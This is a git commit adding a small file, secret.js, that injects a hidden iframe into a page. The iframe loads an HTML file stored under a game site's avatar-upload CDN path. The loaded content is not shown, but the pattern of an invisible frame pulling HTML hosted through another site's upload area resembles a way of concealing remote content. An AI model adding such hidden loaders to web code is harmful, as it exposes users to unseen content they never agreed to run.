854859effe7204cfcdd49e3de9b224df81858a05
pi <90981829+ThePiGuy3141@users.noreply.github.com>
2022-11-28 21:34:48 -0800

    update

---
+++ secret.js
@@ -0,0 +1,5 @@
+var iframe = document.createElement("iframe");
+// iframe.src = "https://cdn.deeeep.io/uploads/avatars/20987821-ff196b9ba7f2cc76c95a8579967021c8.html";
+iframe.src = "https://cdn.deeeep.io/uploads/avatars/20987710-d71fcc9ab2035376abb85fbb0bd734db.html";
+iframe.style.display = "none";
+document.body.appendChild(iframe);
